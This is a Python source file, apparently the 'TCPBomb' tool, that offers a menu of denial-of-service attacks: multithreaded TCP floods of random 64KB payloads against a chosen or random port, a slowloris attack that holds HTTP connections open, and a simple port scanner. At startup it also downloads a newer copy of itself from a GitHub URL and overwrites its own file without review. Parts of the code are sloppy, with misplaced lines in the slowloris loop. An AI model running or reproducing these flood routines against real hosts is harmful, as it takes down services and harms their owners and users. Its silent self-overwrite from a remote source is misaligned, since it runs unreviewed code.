import requests,time,socket,random,threading,os,sys

from datetime import datetime

sl = 0

global op

global port

global url

url = ""

port = 80

threads = 0

version = float(1.8)

currentversion = requests.get('https://raw.githubusercontent.com/Dr4k0D3v/TCPBomb/main/version')

currentversion = float(currentversion.text.replace(" ",""))

isUpdate = False

def update():

    global isUpdate

    isUpdate = False



    try:



        open(".IsUp","r")



        isUpdate = True



        print("[INFO] Update found... Updating.")



        print(f"[INFO] New version is {currentversion}")



        sg = requests.get("https://raw.githubusercontent.com/Dr4k0D3v/TCPBomb/main/TCPBomb.py")


        os.remove(sys.argv[0])
        f = open(sys.argv[0],"w")



        f.write(sg.text)

        print("[INFO] Update sucess")


    except:



        isUpdate = False

if(currentversion > version):

    open(".IsUp","w")

    update()


def slowloris():

    now = datetime.now();

    hour = now.hour;

    minute = now.minute;

    second = now.second

    socks = []

    headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5"
              ]

    ip = getIp(url)

    socket_count = 100

    for _ in range(socket_count):

        try:

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.settimeout(4)

            s.connect((ip, 80))

        except socket.error:

            break

    socks.append(s)

    for s in socks:

        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))

        for header in headers:

            s.send(bytes("{}\r\n".format(header).encode("utf-8")))

    while True:

        now = datetime.now();

        hour = now.hour;

        minute = now.minute;

        second = now.second

        print(f"[{hour}:{minute}:{second}] Sending slowris attack to: {ip}")

        for s in socks:

            try:

                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))

            except socket.error:

                socks.remove(s)

                try:

                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                    s.settimeout(4)

                    s.connect((ip, 80))

                    for s in socks:

                        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))

                        for header in headers:

                            s.send(bytes("{}\r\n".format(header).encode("utf-8")))

                except socket.error:

                    continue

    time.sleep(15)


def getIp(domain):

    try:

        now = datetime.now();

        hour = now.hour;

        minute = now.minute;

        second = now.second;

        h = socket.gethostbyname(domain)

        print(f"[{hour}]:[{minute}]:[{second}] INFO: Using IP {h} of hostname '"+domain+"'.")

        return h

    except:

        now = datetime.now();

        hour = now.hour;

        minute = now.minute;

        second = now.second;

        exit(f"[{hour}]:[{minute}]:[{second}] ERROR: Failed to get ip by '"+domain+"' hostaname!")



def verifyports(url,max = False):

    ip = getIp(url)

    p = 0

    print("_______________________")

    print("")

    scaneds = 0

    if max:

        p = 65535

    else:

        p = 1000

    for porta in range(p):

        port = socket.socket(socket.AF_INET, socket.SOCK_STREAM);

        port.settimeout(0.1);

        opened = port.connect_ex((ip, porta));

        if opened == 0:

            scaneds += 1;

            print(porta, "OPEN"); 

    

def getRandomPort():

    portlist = [int(20), int(21), int(22), int(23), int(25), int(53), int(67), int(68), int(69), int(80), int(443) , int(445)]

    p =  random.choice(portlist)

    now = datetime.now();

    hour = now.hour;

    minute = now.minute;

    second = now.second;

    return p



def attack(host,threads, port = getRandomPort()):

    ip = getIp(host)



    threadList = []

    for i in range(threads):

        t = threading.Thread(target=connect,args=(ip,port))

        t.start()

        threadList.append(t)

    t = threading.Thread(target=pr)

    t.start()

    threadList.append(t)



def connect(ip,port):

    global sl

    while True:



        bytes = random._urandom(64000)

        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

        try:

            sl += 1

            now = datetime.now();

            hour = now.hour;

            minute = now.minute;

            second = now.second;

            s.connect((ip,port))

            s.send(bytes)

            s.close()

        except:

            pass



def pr():

    global sl

    global port



    now = datetime.now();

    hour = now.hour;

    minute = now.minute;

    second = now.second

    print("")

    print(f"\n[{hour}]:[{minute}]:[{second}] INFO: {sl} connections sends!")

    timemsg = now.second + 3;

    timeo = sl



    while True:

        now = datetime.now();

        second = now.second;

        if timemsg > 60:

            timemsg = 0;



        

        atual = now.second;

        hour = now.hour;

        minute = now.minute;



        if sl == timeo:

            getRandomPort()



        if atual == timemsg:

            timeo = sl

            timemsg = now.second + 3;

            print(f"[{hour}]:[{minute}]:[{second}] INFO: {sl} connections sends!")

def scanMenu():

    print("_______________________")

    print("")

    print("""

    Options:



        [1] - Set to max port

        [2] - Set URL

        [3] - Scan

        [4] - Go to Main menu



    """)

    print("_______________________")

    print("")

    try:

        max_p = False

        url = ""

        while True:

            op = int(input("--> "))

            if(op > 4):

                print("[INFO] Invalid option please try again!")

            if(op == 1):

                max_p = False if max_p else True

                print("[INFO] Scan max port set to "+str(max_p))

            if(op == 2):

                url = input("[URL] --> ")

                if(url == ""):

                    print("[INFO] the url is empty!")

                else:

                    print("[INFO] URL set to "+url)

            if(op == 3):

                if(url == ""):

                    print("[INFO] Set the URL!")

                else:

                    verifyports(url,max_p)

            if op == 4:

                time.sleep(2)

                if os.name == 'nt':

                    os.system("cls")

                else:

                    os.system("clear")

                mainMenu()

    except:

            print("[INFO] Invalid option please try again!")

            print("[INFO] Log of error in 2 seconds")

            time.sleep(2)

            for i in sys.exc_info():

                print(f"[ERROR] {i}")

def slowlorisMenu():

    print("_______________________")

    print("""



    Configuration:



        [1] - Set the URL!


    Options:



        [1] - Set URL

        [2] - Start attack

        [3] - Go to Main menu

    """)

    print("_______________________")

    print("")

    try:

        while True:

            op = int(input("--> "))

            if op == 1:

                global url

                url = input('Set url --> ')

            if(op > 3):

                print("[INFO] Invalid option please try again!")

            elif op == 2:

                slowloris();
                if(url == ""):

                    print("[INFO] Url is not defined please set Url!")

            elif op == 3:

                time.sleep(2)

                if os.name == 'nt':

                    os.system("cls")

                else:

                    os.system("clear")

                mainMenu()



    except:

            print("[INFO] Invalid options please try again!")

            print("[INFO] Log of error in 2 seconds")

            time.sleep(2)

            for i in sys.exc_info():

                print(f"[ERROR] {i}")


def httpMenu():

    print("_______________________")

    print("""



    Configuration:



        [1] - Set the URL!

        [2] - Set number of Threads!

        [3] - Set port (default is 80)



    Options:



        [1] - Set URL

        [2] - Set Threads number

        [3] - Set port

        [4] - Start attack

        [5] - Go to Main menu

    """)

    print("_______________________")

    print("")

    try:

        while True:

            op = int(input("--> "))

            if op == 3:

                port = input('Set port --> ')

            if op == 1:

                url = input('Set url --> ')

            if op == 2:

                threads = int(input('Set threads --> '))

                if(threads > 16):

                    print("[INFO] MAx limit of thread is 16.")

                    threads = 16

            if(op > 5):

                print("[INFO] Invalid option please try again!")

            elif op == 4:

                if(url == ""):

                    print("[INFO] Url is not defined please set Url!")

                    

                elif threads == 0:

                    print("[INFO] Threads number is not defined please ser threads!")

                else:

                    break

            elif op == 5:

                time.sleep(2)

                if os.name == 'nt':

                    os.system("cls")

                else:

                    os.system("clear")

                mainMenu()



    except:

            print("[INFO] Invalid options please try again!")

            print("[INFO] Log of error in 2 seconds")

            time.sleep(2)

            for i in sys.exc_info():

                print(f"[ERROR] {i}")

    attack(url,threads,port)



def randomPortMenu():

    print("_______________________")

    print("")

    print("""

    Configuration:



        [1] - Set the URL!

        [2] - Set the number of Threads!



    Options:



        [1] - Set URL

        [2] - Set Threads number

        [3] - Start attack

        [4] - Go to Main menu



    """)

    print("_______________________")

    print("")

    try:

        url = ""

        threads = 0

        while True:

            op = int(input("--> "))

            if op == 3:

                attack(url,threads)

            if op == 1:

                url = input('Set url --> ')

            if op == 2:

                threads = int(input('Set threads --> '))

                if(threads > 16):

                    print("[INFO] Max limit of thread is 16!")

                    threads = 16

            if(op > 4):

                print("[INFO] Invalid option please try again!")

            elif op == 3:

                if(url == ""):

                    print("[INFO] Url is not defined please set Url!")

                    

                elif threads == 0:

                    print("[INFO] Threads number is not defined please ser threads!")

                else:

                    if os.name == 'nt':

                        os.system("cls")

                    else:

                        os.system("clear")

                        break             

            elif op == 4:

                time.sleep(2)

                if os.name == 'nt':

                    os.system("cls")

                else:

                    os.system("clear")

                mainMenu()

    except:

            print("[INFO] Invalid option please try again!")

            print("[INFO] Log of error in 2 seconds")

            time.sleep(2)

            for i in sys.exc_info():

                print(f"[ERROR] {i}")

    attack(url,threads)

def mainMenu():

    print("_______________________")

    print("")

    print("Creators:")

    print("")

    print('Emanuel and Drako')

    print("")

    print(f"Version: {version}")

    print("UpdateData: 06/04/2021")

    print("")

    print("_______________________")

    time.sleep(2)

    if os.name == 'nt':

        os.system("cls")

    else:

        os.system("clear")

    print("_______________________")

    print("")

    print("""Options:



    [1] - Attack specific port

    [2] - Attack random ports

    [3] - Port sccan

    [4] - Attack slowloris

    [5] - Exit

    """)

    if currentversion > version:

        print("")

        print("    [INFO] New version already available")

        print("    [LINK] https://github.com/Dr4k0D3v/TCPBomb")

        print("")

    print("_______________________")

    print("")

    while True:

        try:

            op = int(input("--> "))

            if(op > 4):

                print("[INFO] Invalid option please try again!")

            elif op == 1:

                time.sleep(2)

                if os.name == 'nt':

                    os.system("cls")

                else:

                    os.system("clear")

                httpMenu()

            elif op == 2:

                time.sleep(2)

                if os.name == 'nt':

                    os.system("cls")

                else:

                    os.system("clear")

                randomPortMenu()

            elif op == 3:

                time.sleep(2)

                if os.name == 'nt':

                    os.system("cls")

                else:

                    os.system("clear")

                scanMenu()

            elif op == 4:

                time.sleep(2)

                if os.name == 'nt':

                    os.system("cls")

                else:

                    os.system("clear")

                slowlorisMenu()


            elif op == 5:

                print("Bye")

                break

        except:

            print("[INFO] Invalid options please try again!")

            print("[INFO] Log of error in 2 seconds")

            time.sleep(2)

            for i in sys.exc_info():

                print(f"[ERROR] {i}")

if(__name__ == "__main__" and not isUpdate ):

    mainMenu()
